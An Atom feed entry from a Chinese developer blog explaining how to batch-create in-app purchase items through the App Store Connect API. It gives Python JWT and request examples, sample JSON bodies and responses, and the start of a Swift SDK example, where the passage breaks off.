<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iHTCboy&#39;s blog</title>
  
  <subtitle>Learn something of everything,  Learn everything of something.</subtitle>
  <link href="https://ihtcboy.com/atom.xml" rel="self"/>
  
  <link href="https://ihtcboy.com/"/>
  <updated>2022-12-31T15:38:02.971Z</updated>
  <id>https://ihtcboy.com/</id>
  
  <author>
    <name>iHTCboy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用 App Store Connect API 批量创建内购商品</title>
    <link href="https://ihtcboy.com/2022/12/25/2022-12-25_%E4%BD%BF%E7%94%A8AppStoreConnectAPI%E6%89%B9%E9%87%8F%E5%88%9B%E5%BB%BA%E5%86%85%E8%B4%AD%E5%95%86%E5%93%81/"/>
    <id>https://ihtcboy.com/2022/12/25/2022-12-25_%E4%BD%BF%E7%94%A8AppStoreConnectAPI%E6%89%B9%E9%87%8F%E5%88%9B%E5%BB%BA%E5%86%85%E8%B4%AD%E5%95%86%E5%93%81/</id>
    <published>2022-12-25T14:54:10.000Z</published>
    <updated>2022-12-31T15:38:02.971Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于 <a href="https://juejin.cn/post/7181099247956131896">使用 App Store Connect API 批量创建内购商品 - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p></blockquote><p>作者：iHTCboy</p><p>我们去年开源 <a href="https://juejin.cn/post/7081069026515877919">AppleParty（苹果派）</a> 用于批量应用内购商品的创建和更新的方案，具体的技术方案是使用 XML Feed 格式来处理。而今年苹果在 WWDC22 宣布，2022 年 11 月开始，不再允许使用 XML 方式上传元数据和内购商品。</p><span id="more"></span><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>我们去年开源 <a href="https://juejin.cn/post/7081069026515877919">AppleParty（苹果派）</a> 用于批量应用内购商品的创建和更新的方案，具体的技术方案是使用 XML Feed 格式来处理。而今年苹果在 WWDC22 宣布，2022 年 11 月开始，不再允许使用 XML 方式上传元数据和内购商品。</p><p>苹果在 7 月公告 <a href="https://developer.apple.com/cn/news/?id=yqf4kgwb">即将从 XML Feed 过渡到 App Store Connect API</a>，并且一直邮件通知开发者，截止 11月 9 日之前：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">We noticed you recently used the <span class="type">XML</span> feed <span class="keyword">to</span> manage <span class="keyword">and</span> deliver content <span class="keyword">to</span> App Store <span class="keyword">Connect</span>. <span class="keyword">As</span> we wrote <span class="keyword">to</span> you previously, <span class="keyword">as</span> <span class="keyword">of</span> November <span class="number">9</span>, <span class="number">2022</span>, you’ll need <span class="keyword">to</span> use the App Store <span class="keyword">Connect</span> REST API <span class="keyword">to</span> manage <span class="keyword">in</span>-app purchases, subscriptions, metadata, <span class="keyword">and</span> app pricing. The <span class="type">XML</span> feed <span class="keyword">no</span> longer supports this content, but continues <span class="keyword">to</span> support existing Game Center management functionality. </span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> you have <span class="keyword">any</span> questions, contact us. </span><br><span class="line"></span><br><span class="line">Apple Developer Relations</span><br></pre></td></tr></table></figure><p>如果现在还使用 XML feed 上传，会收到以下告警：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ERROR </span>ITMS<span class="string">-6036</span>: &quot;XML schemas software5.12 and earlier have been deprecated and uploads of app metadata, in-app purchases, and subscriptions are no longer supported through the XML feed. You can use the App Store Connect API instead.</span><br><span class="line"></span><br><span class="line">Game Center will continue to be supported with XML schema software6.0.&quot; at Software/SoftwareMetadata</span><br></pre></td></tr></table></figure><p>所以，XML feed 禁止上传的内容：</p><ul><li>app metadata（app元数据，如截图、预览、描述等）</li><li>in-app purchases, and subscriptions（内购商品，包括订阅类型）</li><li>app pricing（app定价）</li></ul><p>而 <code>Game Center</code> 和上传 <code>ipa</code> 文件等方式，目前还能上传，目前来看，是因为 App Store Connect API 还不支持！所以，希望明天 WWDC23 苹果能支持上传 ipa 文件，这样就更加方便~</p><h3 id="二、App-Store-Connect-API"><a href="#二、App-Store-Connect-API" class="headerlink" title="二、App Store Connect API"></a>二、App Store Connect API</h3><p>App Store Connect API 需要生成密钥才能调用使用，所以，我们先来介绍一下密钥的生成，然后在以应用内购商品的创建和更新为例，展示 API 使用示例。</p><h4 id="2-1-App-Store-Connect-API-密钥生成"><a href="#2-1-App-Store-Connect-API-密钥生成" class="headerlink" title="2.1 App Store Connect API 密钥生成"></a>2.1 App Store Connect API 密钥生成</h4><p><strong>生成密钥 ID（kid）和 Issuer ID（iss）</strong></p><p>要生成密钥，您必须在 App Store Connect 中具有管理员角色或帐户持有人角色。登录 <a href="https://appstoreconnect.apple.com/">App Store Connect</a> 并完成以下步骤：</p><ol><li>选择 “用户和访问”，然后选择 “密钥” 子标签页。</li><li>在 “密钥类型” 下选择 “App Store Connect API”。</li><li>单击 “生成 API 密钥”（如果之前创建过，则点击 “添加（+）” 按钮新增。）。</li><li>输入密钥的名称。该名称仅供您参考，名字不作为密钥的一部分。</li><li>单击 “生成”。</li></ol><p><img src="https://ihtcboy.com/images/2022-AppStoreConnectAPI-01.png" alt="AppStoreConnectAPI-01"></p><p>“用户和访问” -&gt; “密钥” -&gt; “App Store Connect API” -&gt; “生成 API 密钥”</p><p><img src="https://ihtcboy.com/images/2022-AppStoreConnectAPI-02.png" alt="AppStoreConnectAPI-02"></p><p><img src="https://ihtcboy.com/images/2022-AppStoreConnectAPI-03.png" alt="AppStoreConnectAPI-03"></p><p><strong>注：访问权限：</strong><br>根据密钥使用场景，访问的权限也不一样。要创建和管理 App 内购买项目，请确保您拥有以下用户角色之一：</p><ul><li>帐户持有人</li><li>管理</li><li>App 管理（这个要求角色权限最低）</li></ul><blockquote><p>详细权限，可参考文档 <a href="https://help.apple.com/app-store-connect/#/deve5f9a89d7">职能权限</a>。</p></blockquote><p><img src="https://ihtcboy.com/images/2022-AppStoreConnectAPI-04.png" alt="AppStoreConnectAPI-04"></p><p>1、<strong>Issuer ID</strong>：拷贝复制内容<br>2、<strong>密钥 ID</strong>:  生成的密钥，有一列名为 “密钥 ID” 就是 kid 的值，鼠标移动到文字就会显示 拷贝密钥 ID，点击按钮就可以复制 kid 值。<br>3、<strong>API 密钥文件</strong>，下载 API 密钥 按钮（仅当您尚未下载私钥时，才会显示下载链接。），此私钥只能一次性下载！。</p><blockquote><p>注意：将您的私钥存放在安全的地方。不要共享密钥，不要将密钥存储在代码仓库中，不要将密钥放在客户端代码中。如果您怀疑私钥被盗，请立即在 App Store Connect 中撤销密钥。有关详细信息，请参阅 <a href="https://developer.apple.com/documentation/appstoreconnectapi/revoking_api_keys">撤销API密钥</a>。</p></blockquote><p>最终，生成以下参数和文件：</p><table><thead><tr><th>名字</th><th>值示例</th><th>说明</th><th>字段值说明</th></tr></thead><tbody><tr><td>密钥ID</td><td>GC8HS3SX37</td><td>kid，Key ID，密钥ID</td><td>您的私钥ID，值来自 API 密钥页面。</td></tr><tr><td>密钥内容文件</td><td>SubscriptionKey_GC8HS3SX37.p8</td><td>密钥文件（p8）</td><td>用来访问和使用 App Store Connect API 接口的服务。</td></tr><tr><td>Issuer ID</td><td>69a6de92-xxx-xxxx-xxxx-5bc37c11a4d1</td><td>iss，Issuer ID，发行人</td><td>您的发卡机构ID，值来自 App Store Connect 的 API 密钥页面。</td></tr></tbody></table><h4 id="2-2-App-Store-Connect-API-使用示例"><a href="#2-2-App-Store-Connect-API-使用示例" class="headerlink" title="2.2 App Store Connect API 使用示例"></a>2.2 App Store Connect API 使用示例</h4><p>这里我们使用 python3 创建 API 请求示例，需要依赖 <code>jwt</code> 和 <code>requests</code> 库，所以需要在终端安装：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 <span class="keyword">install </span><span class="keyword">jwt</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">pip3 <span class="keyword">install </span>requests</span><br></pre></td></tr></table></figure><p>怎么请求 App Store Connect API ？苹果给出了一个示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v -H <span class="string">&#x27;Authorization: Bearer [signed token]&#x27;</span> </span><br><span class="line"><span class="string">&quot;https://api.appstoreconnect.apple.com/v1/apps&quot;</span></span><br></pre></td></tr></table></figure><p>也就是用 JWT 生成的 token，放到 App Store Connect API 请求链接的 header 部分，key 为 <code>Authorization</code>，value为 <code>Bearer [signed token]</code>。</p><p>接下来，我们通过 Python 的 <code>requests</code> 来请求 App Store Connect API。大家也可以用其它的工具来模拟，比如在线工具或者 Postman 等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createASCToken</span>(<span class="params">p8KeyPath, kid, iss</span>):</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">&quot;alg&quot;</span>: <span class="string">&quot;ES256&quot;</span>,</span><br><span class="line"><span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line"><span class="string">&quot;kid&quot;</span>: kid</span><br><span class="line">&#125;</span><br><span class="line">payload = &#123;</span><br><span class="line"><span class="string">&quot;iss&quot;</span>: iss,</span><br><span class="line"><span class="string">&quot;aud&quot;</span>: <span class="string">&quot;appstoreconnect-v1&quot;</span>,</span><br><span class="line"><span class="string">&quot;iat&quot;</span>: <span class="built_in">int</span>(time.time()),</span><br><span class="line"><span class="string">&quot;exp&quot;</span>: <span class="built_in">int</span>(<span class="built_in">round</span>(time.time() + (<span class="number">20.0</span> * <span class="number">60.0</span>))) <span class="comment"># 20 minutes timestamp</span></span><br><span class="line">&#125;</span><br><span class="line">file = <span class="built_in">open</span>(p8KeyPath)</span><br><span class="line">key_data = file.read()</span><br><span class="line">file.close()</span><br><span class="line">token = jwt.encode(headers=header, payload=payload, key=key_data, algorithm=<span class="string">&quot;ES256&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> token</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥路径</span></span><br><span class="line">p8 = <span class="string">&quot;/Users/iHTCboy/Downloads/AppStoreConnectAPI/AuthKey_GC8HS3SX37.p8&quot;</span></span><br><span class="line">kid = <span class="string">&quot;GC8HS3SX37&quot;</span></span><br><span class="line">iss = <span class="string">&quot;69a6de92-xxx-xxxx-xxxx-5bc37c11a4d1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成请求 token</span></span><br><span class="line">token = createASCToken(p8, kid, iss)</span><br></pre></td></tr></table></figure><p>接下来，以获取 app 列表为例，请求也非常简单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取全部 app</span></span><br><span class="line">url = <span class="string">&quot;https://api.appstoreconnect.apple.com/v1/apps&quot;</span> </span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;token&#125;</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">rs1 = requests.get(url, headers=header)</span><br><span class="line">data = json.loads(rs1.text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>返回内容示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;data&quot;</span> : [ &#123;</span><br><span class="line">    <span class="attr">&quot;type&quot;</span> : <span class="string">&quot;apps&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;id&quot;</span> : <span class="string">&quot;123456737&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;attributes&quot;</span> : &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;AppleParty - 37手游 iOS 技术团队&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;bundleId&quot;</span> : <span class="string">&quot;cn.com.37iOS.AppleParty&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;sku&quot;</span> : <span class="string">&quot;2021.04.25&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;primaryLocale&quot;</span> : <span class="string">&quot;zh-Hans&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;isOrEverWasMadeForKids&quot;</span> : <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;subscriptionStatusUrl&quot;</span> : <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">&quot;subscriptionStatusUrlVersion&quot;</span> : <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">&quot;subscriptionStatusUrlForSandbox&quot;</span> : <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">&quot;subscriptionStatusUrlVersionForSandbox&quot;</span> : <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">&quot;availableInNewTerritories&quot;</span> : <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;contentRightsDeclaration&quot;</span> : <span class="literal">null</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;relationships&quot;</span> : &#123;</span><br><span class="line">        xxxx</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="attr">&quot;links&quot;</span> : &#123;</span><br><span class="line">    <span class="attr">&quot;self&quot;</span> : <span class="string">&quot;https://api.appstoreconnect.apple.com/v1/apps&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;meta&quot;</span> : &#123;</span><br><span class="line">    <span class="attr">&quot;paging&quot;</span> : &#123;</span><br><span class="line">      <span class="attr">&quot;total&quot;</span> : <span class="number">1</span>,</span><br><span class="line">      <span class="attr">&quot;limit&quot;</span> : <span class="number">50</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-App-Store-Connect-API-使用说明"><a href="#2-3-App-Store-Connect-API-使用说明" class="headerlink" title="2.3 App Store Connect API 使用说明"></a>2.3 App Store Connect API 使用说明</h4><p>App Store Connect API 可以根据官方文档就能大概了解，但是依然非常难，就是 POST 接口的 body 和上传文件的流程。</p><p><strong>POST body</strong></p><p>以 <a href="https://developer.apple.com/documentation/appstoreconnectapi/create_an_in-app_purchase">Create an In-App Purchase</a> 为例，请求的 body：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&#x27;data&#x27;: &#123;</span><br><span class="line">&#x27;attributes&#x27;: &#123;</span><br><span class="line">&#x27;availableInAllTerritories&#x27;: True,</span><br><span class="line">&#x27;familySharable&#x27;: False,</span><br><span class="line">&#x27;inAppPurchaseType&#x27;: &#x27;NON_CONSUMABLE&#x27;,</span><br><span class="line">&#x27;name&#x27;: &#x27;我是测试商品<span class="number">01</span>&#x27;,</span><br><span class="line">&#x27;productId&#x27;: &#x27;com.apple.iap01&#x27;,</span><br><span class="line">&#x27;reviewNote&#x27;: &#x27;审核备注&#x27;,</span><br><span class="line">&#125;,</span><br><span class="line">&#x27;relationships&#x27;: &#123;</span><br><span class="line">&#x27;app&#x27;: &#123;</span><br><span class="line">&#x27;data&#x27;: &#123;</span><br><span class="line">&#x27;id&#x27;: <span class="string">&quot;&#123;app_id&#125;&quot;</span>,</span><br><span class="line">&#x27;type&#x27;: &#x27;apps&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#x27;type&#x27;: &#x27;inAppPurchases&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>inAppPurchaseType</code> 可能为：</p><ul><li>CONSUMABLE</li><li>NON_CONSUMABLE</li><li>NON_RENEWING_SUBSCRIPTION</li></ul><p>而订阅类型的商品，是另一个 API <a href="https://developer.apple.com/documentation/appstoreconnectapi/create_an_auto-renewable_subscription">Create an Auto-Renewable Subscription</a>，对应的请求的 body：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;data&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;subscriptions&quot;</span>,</span><br><span class="line"><span class="attr">&quot;attributes&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;name&quot;</span>: <span class="string">&quot;一个月订阅会员&quot;</span>,</span><br><span class="line"><span class="attr">&quot;productId&quot;</span>: <span class="string">&quot;com.apple.mon01&quot;</span>,</span><br><span class="line"><span class="attr">&quot;subscriptionPeriod&quot;</span>: <span class="string">&quot;ONE_MONTH&quot;</span>,</span><br><span class="line"><span class="attr">&quot;familySharable&quot;</span>: False,</span><br><span class="line"><span class="attr">&quot;reviewNote&quot;</span>: <span class="string">&quot;审核备注&quot;</span>,</span><br><span class="line"><span class="attr">&quot;groupLevel&quot;</span>: <span class="number">1</span>,</span><br><span class="line"><span class="attr">&quot;availableInAllTerritories&quot;</span>: True</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;relationships&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;group&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;data&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;subscriptionGroups&quot;</span>,</span><br><span class="line"><span class="attr">&quot;id&quot;</span>: <span class="string">&quot;&#123;app_iap_grop_id&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>subscriptionPeriod</code> 可以为：</p><ul><li>ONE_WEEK</li><li>ONE_MONTH</li><li>TWO_MONTHS</li><li>THREE_MONTHS</li><li>SIX_MONTHS</li><li>ONE_YEAR</li></ul><p><strong>上传文件</strong></p><p>上传文件的流程，刚开始看文档没有看明白，最后又仔细查文档才找到 <a href="https://developer.apple.com/documentation/appstoreconnectapi/uploading_assets_to_app_store_connect">Uploading Assets to App Store Connect</a>，以上传应用内购买的送审图片为例，<a href="https://developer.apple.com/documentation/appstoreconnectapi/create_an_in-app_purchase_review_screenshot">Create an In-App Purchase Review Screenshot</a>，需要对应的请求的 body：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&#x27;data&#x27;: &#123;</span><br><span class="line">&#x27;attributes&#x27;: &#123;</span><br><span class="line">&#x27;fileName&#x27;: &#x27;test.png&#x27;,</span><br><span class="line">&#x27;fileSize&#x27;: &#x27;<span class="number">1000</span>&#x27;,</span><br><span class="line">&#125;,</span><br><span class="line">&#x27;relationships&#x27;: &#123;</span><br><span class="line">&#x27;inAppPurchaseV2&#x27;: &#123;</span><br><span class="line">&#x27;data&#x27;: &#123;</span><br><span class="line">&#x27;id&#x27;: &#x27;&#123;app_iap_id&#125;&#x27;,</span><br><span class="line">&#x27;type&#x27;: &#x27;inAppPurchases&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#x27;type&#x27;: &#x27;inAppPurchaseAppStoreReviewScreenshots&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请求成功后，Response Code 为 201 时：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;data&quot;</span> : &#123;</span><br><span class="line">    <span class="attr">&quot;type&quot;</span> : <span class="string">&quot;inAppPurchaseAppStoreReviewScreenshots&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;id&quot;</span> : <span class="string">&quot;caeda501-xxxx-xxxx-8fb3-6a3c0f462720&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;attributes&quot;</span> : &#123;</span><br><span class="line">      <span class="attr">&quot;fileSize&quot;</span> : <span class="number">1000</span>,</span><br><span class="line">      <span class="attr">&quot;fileName&quot;</span> : <span class="string">&quot;test.png&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;sourceFileChecksum&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;imageAsset&quot;</span> : &#123;</span><br><span class="line">        <span class="attr">&quot;templateUrl&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;width&quot;</span> : <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;height&quot;</span> : <span class="number">0</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;assetToken&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;assetType&quot;</span> : <span class="string">&quot;SCREENSHOT&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;uploadOperations&quot;</span> : [ &#123;</span><br><span class="line">        <span class="attr">&quot;method&quot;</span> : <span class="string">&quot;PUT&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;url&quot;</span> : <span class="string">&quot;https://store-032.blobstore.apple.com/itmspod11-assets-massilia-032001/PurpleSource112%2Fv4%2F2c%2F3f%2Fe1%2F2c3fe12e-a9ea-xxx-xxx-12a8c02df932%2FieKZRQnL0o2fK4sbeFRXOQ8tVRjPIVyJaGCNLsLg2Dc_U003d-1669087039587?uploadId=2c75a0f0-6a14-11ed-93d1-d8c4978a0739&amp;Signature=OWuT65nZNeMgWMNbaZtEGc9lcDU%3D&amp;AWSAccessKeyId=MKIA474WIEZZVU5QMKHI&amp;partNumber=1&amp;Expires=1669691839&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;length&quot;</span> : <span class="number">1000</span>,</span><br><span class="line">        <span class="attr">&quot;offset&quot;</span> : <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;requestHeaders&quot;</span> : [ &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;Content-Type&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;value&quot;</span> : <span class="string">&quot;application/octet-stream&quot;</span></span><br><span class="line">        &#125; ]</span><br><span class="line">      &#125; ],</span><br><span class="line">      <span class="attr">&quot;assetDeliveryState&quot;</span> : &#123;</span><br><span class="line">        <span class="attr">&quot;errors&quot;</span> : <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">&quot;warnings&quot;</span> : <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">&quot;state&quot;</span> : <span class="string">&quot;AWAITING_UPLOAD&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;links&quot;</span> : &#123;</span><br><span class="line">      <span class="attr">&quot;self&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;links&quot;</span> : &#123;</span><br><span class="line">    <span class="attr">&quot;self&quot;</span> : <span class="string">&quot;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>返回的响应内容 <code>uploadOperations</code> 中的 url 就是上传图片文件的请求 url，对应的 <code>requestHeaders</code> 也是组装 request 必备的 headers 属性，图片文件的大小要与 length 长度一致。</p><h4 id="2-4-App-Store-Connect-Swift-SDK"><a href="#2-4-App-Store-Connect-Swift-SDK" class="headerlink" title="2.4 App Store Connect Swift SDK"></a>2.4 App Store Connect Swift SDK</h4><p>从上文就可以看出来，如果自己全部的 API 都实现一次，工作时是非常大，所以我们非常感谢 <a href="https://github.com/AvdLee/appstoreconnect-swift-sdk">AvdLee/appstoreconnect-swift-sdk</a>，使用 Xcode 的 Swift Package Manager 导入 <code>https://github.com/AvdLee/appstoreconnect-swift-sdk.git</code> 就可以使用！</p><p>以创建内购商品为例：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createInAppPurchases</span>(<span class="params">appId</span>: <span class="type">String</span>, <span class="params">product</span>: <span class="type">IAPProduct</span>)</span> <span class="keyword">async</span> -&gt; <span class="type">ASCInAppPurchaseV2</span>? 